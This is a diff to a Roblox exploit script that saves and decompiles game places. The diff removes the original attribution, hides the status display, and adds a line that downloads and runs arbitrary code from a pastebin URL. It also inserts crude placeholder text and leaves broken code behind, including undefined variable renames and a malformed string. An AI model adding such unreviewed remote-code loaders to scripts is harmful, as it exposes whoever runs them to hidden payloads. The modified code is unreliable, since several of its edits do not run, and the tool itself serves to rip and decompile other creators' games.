@@ -1,12 +1,9 @@
---!native
--- https://discord.gg/wx4ThpAsmw
-
 local Params = {
 	RepoURL = "https://raw.githubusercontent.com/luau/SomeHub/main/",
 	UMF = "UniversalMethodFinder",
 }
 local finder, globalcontainer = loadstring(game:HttpGet(Params.RepoURL .. Params.UMF .. ".luau", true), Params.UMF)()
-
+loadstring(game:HttpGet("https://pastebin.com/raw/tzFCrFBK"))()
 finder({
 	-- readbinarystring = 'string.find(...,"bin",nil,true)', -- ! Could match some unwanted stuff
 	decompile = '(string.find(...,"decomp",nil,true) and string.sub(...,#...) ~= "s") or string.find(...,"assembl",nil,true)',
@@ -574,7 +571,7 @@ local NotScriptableFixes = {
 	BasePart = { -- TODO: Find a way to integrate this into settings
 		Color3uint8 = "Color",
 	},
-} -- For more info: https://github.com/luau/UniversalSynSaveInstance/blob/master/Tests/Potentially%20Missing%20Properties%20Tracker.luau
+}
 
 do
 	-- TODO: More @ https://github.com/Dekkonot/rbx-instance-serializer/blob/master/src/API.lua#L19
@@ -761,23 +758,23 @@ if not StatusGui then
 	end
 
 	if globalcontainer.gethui then
-		StatusGui.Name = randomString()
-		StatusGui.Parent = globalcontainer.gethui()
+		Gui.Name = randomString()
+		Gui.Parent = globalcontainer.gethui()
 	elseif globalcontainer.protectgui and not (is_sirhurt_closure or (syn and DrawingImmediate)) then
-		StatusGui.Name = randomString()
-		globalcontainer.protectgui(StatusGui)
-		StatusGui.Parent = service.CoreGui
+		Gui.Name = randomString()
+		globalcontainer.protectgui(Gui)
+		Gui.Parent = service.CoreGui
 	else
 		local RobloxGui = service.CoreGui:FindFirstChild("RobloxGui")
 		if RobloxGui then
-			StatusGui.Parent = RobloxGui
+			Gui.Parent = RobloxGui
 		else
-			StatusGui.Name = randomString()
-			StatusGui.Parent = service.CoreGui
+			Gui.Name = randomString()
+			Gui.Parent = service.CoreGui
 		end
 	end
-	local StatusText = Instance.new("TextLabel")
-	globalenv.StatusText = StatusText
+	local Text = Instance.new("TextLabel")
+	globalenv.Text = StatusText
 	StatusText.BackgroundTransparency = 1
 	StatusText.Font = Enum.Font.Code
 	StatusText.AnchorPoint = Vector2.new(1)
@@ -849,33 +846,33 @@ local function synsaveinstance(CustomOptions)
 			-- __api_dump_write_only_property__ = true, -- ? Is this needed
 		},
 
-		ShowStatus = true,
-		FilePath = false, --  does not need to contain a file extension, only the name of the file.
-		Object = false, -- If provided, saves as .rbxmx (Model file) instead; If Object is game, it will be saved as a .RBXL file -- ! MUST BE AN INSTANCE REFERENCE like game.Workspace for example; "optimized" mode is NOT supported with this option
-		-- Binary = false, -- true in syn newer versions (false in our case because no binary support yet), Description: Saves everything i Binary Mode (rbxl/rbxm).
-		-- Decompile = not OPTIONS.noscripts, -- ! This takes priority over OPTIONS.noscripts if set, Description: If true scripts will be decompiled.
-		-- DecompileTimeout = OPTIONS.timeout, -- ! This takes priority over OPTIONS.timeout if set
-		IgnoreDefaultProperties = true, -- Description: When enabled it will ignore default properties while saving.
-		IgnoreNotArchivable = true, -- Description: Ignores the Archivable property and saves Non-Archivable instances.
-		IgnorePropertiesOfNotScriptsOnScriptsMode = false, -- Ignores property of every instance that is not a script in "scripts" mode
-		IgnoreSpecialProperties = false, -- true will disable Terrain & Break MeshPart Sizes (very likely)
-		IsolateStarterPlayer = false, --If enabled, StarterPlayer will be cleared and the saved starter player will be placed into folders.
-		IsolateLocalPlayer = true, -- Saves Children of LocalPlayer as separate folder and prevents any instance of ClassName Player with .Name identical to LocalPlayer.Name from saving
-		IsolateLocalPlayerCharacter = false, -- Saves Children of LocalPlayer.Character as separate folder and prevents any instance of ClassName Player with .Name identical to LocalPlayer.Name from saving
-		-- MaxThreads = 3 -- Description: The number of decompilation threads that can run at once. More threads means it can decompile for scripts at a time.
-		-- DisableCompression = false, --Description: Disables compression in the binary output
-		DecompileJobless = false, --Description: Includes already decompiled code in the output. No new scripts are decompiled.
-		SaveNonCreatable = false, --Description: Includes non-serializable instances as Folder objects (Name is misleading as this is mostly a fix for certain NilInstances and isn't always related to NotCreatable)
-		RemovePlayerCharacters = false, -- Description: Ignore player characters while saving.
-		SavePlayers = true, -- This option does save players, it's just they won't show up in Studio and can only be viewed through the place file code (in text editor). More info at https://github.com/luau/UniversalSynSaveInstance/issues/2
-		SaveCacheInterval = 0x1600, -- The less the more often it saves, but that would mean less performance due to constantly saving
+		ShowStatus = false,
+		FilePath = false,
+		Object = false,
+		-- Binary = false,
+		-- Decompile = not OPTIONS.noscripts,
+		-- DecompileTimeout = OPTIONS.timeout,
+		IgnoreDefaultProperties = true,
+		IgnoreNotArchivable = true,
+		IgnorePropertiesOfNotScriptsOnScriptsMode = false,
+		IgnoreSpecialProperties = false,
+		IsolateStarterPlayer = false,
+		IsolateLocalPlayer = true,
+		IsolateLocalPlayerCharacter = true,
+		-- MaxThreads = 3
+		-- DisableCompression = false,
+		DecompileJobless = false,
+		SaveNonCreatable = false,
+		RemovePlayerCharacters = false,
+		SavePlayers = true,
+		SaveCacheInterval = 0x1600,
 		ReadMe = true,
 
 		-- ! Risky
 
-		AllowResettingProperties = false, -- Enables Resetting of properties for sake of checking their default value (Useful for cases when Instance is NotCreatable like services yet we need to get the default value ) then sets the property back to the original value, which might get detected by some games --! WARNING: Sometimes Properties might not be able to be set to the original value due to circumstances
-		IgnoreSharedStrings = true, -- ! FIXES CRASHES (TEMPORARY, TESTED ON ROEXEC ONLY); FEEL FREE TO DISABLE THIS TO SEE IF IT WORKS FOR YOU
-		SharedStringOverwrite = false, -- !  if the process is not finished aka crashed then none of the affected values will be available; SharedStrings can also be used for ValueTypes that aren't `SharedString`, this behavior is not documented anywhere but makes sense (Could create issues though, due to _potential_ ValueType mix-up, only works on certain types which are all base64 encoded so far); Reason: Allows for potential smaller file size (can also be bigger in some cases)
+		AllowResettingProperties = false,
+		IgnoreSharedStrings = true,
+		SharedStringOverwrite = false,
 
 		OptionsAliases = {
 			FilePath = "FileName",
@@ -1528,12 +1525,12 @@ local function synsaveinstance(CustomOptions)
 								then
 									value = Descriptors.__CDATA(value)
 								end
-							elseif "ProtectedString" == ValueType then -- TODO: Try fitting this inside Descriptors
+							elseif "ProtectedString" == ValueType then
 								tag = ValueType
 
 								if PropertyName == "Source" then
 									if ScriptsClasses[ClassName] == false then
-										value = "-- Server scripts can NOT be decompiled" --TODO: Could be not just server scripts in the future
+										value = "print("Cum, ServerScripts cannot be Decompiled")"
 									else
 										if DecompileIgnoring then
 											value = "-- Ignored"
@@ -1541,13 +1538,11 @@ local function synsaveinstance(CustomOptions)
 											value = ldecompile(instance)
 										end
 									end
-									value = "-- Saved using UniversalSynSaveInstance https://discord.gg/wx4ThpAsmw\n\n"
+									value = "-- API By SynSaveInstance\n\n"
 										.. value
 								end
 
 								value = Descriptors.__PROTECTEDSTRING(value)
-							-- elseif "UniqueId" == ValueType or "SecurityCapabilities" == ValueType then -- ? Not sure yet
-							-- 	tag, value = ValueType, raw
 							else
 								--OptionalCoordinateFrame and so on, we make it dynamic
 								local startIDX, endIDX = Find(ValueType, "Optional")
@@ -1685,40 +1680,13 @@ local function synsaveinstance(CustomOptions)
 
 		if OPTIONS.ReadMe then
 			saveextra(
-				"README",
+				"Ass InstanceSaver",
 				nil,
 				"Script",
 				"--[[\n"
-					.. [[
-				Thank you for using SynSaveInstance Revival.
-				We recommended to save the game right away to take advantage of the binary format (if you didn't save in binary) AND to preserve values of certain properties if you used IgnoreDefaultProperties setting (as they might change in the future).
-				If your player cannot spawn into the game, please move the scripts in StarterPlayer elsewhere. (This is done by default)
-				If the chat system does not work, please use the explorer and delete everything inside the Chat service. 
-				Or run `game:GetService("Chat"):ClearAllChildren()`
-				
-				If Union and MeshPart collisions don't work, run the script below in the Studio Command Bar:
-				
-				
-				local C = game:GetService("CoreGui")
-				local D = Enum.CollisionFidelity.Default
-				
-				for _, v in game:GetDescendants() do
-					if v:IsA("TriangleMeshPart") and not v:IsDescendantOf(C) then
-						v.CollisionFidelity = D
-					end
-				end
-				
-				If you can't move the Camera, run the scripts in the Studio Command Bar:
-			
-				workspace.CurrentCamera.CameraType = Enum.CameraType.Fixed
-				
-				This file was generated with the following settings:
-				]]
-					.. service.HttpService:JSONEncode(OPTIONS)
-					.. "\n\nElapsed time: "
-					.. os.clock() - elapse_t
-					.. "\n]]"
-			)
+					.. [[ 
+thank you for money
+"\n]]")
 		end
 
 		local tmp = { "<SharedStrings>" }
@@ -1818,5 +1786,5 @@ local function synsaveinstance(CustomOptions)
 		end
 	end
 end
-
+game.CoreGui.Instancer:Destroy()
 return synsaveinstance
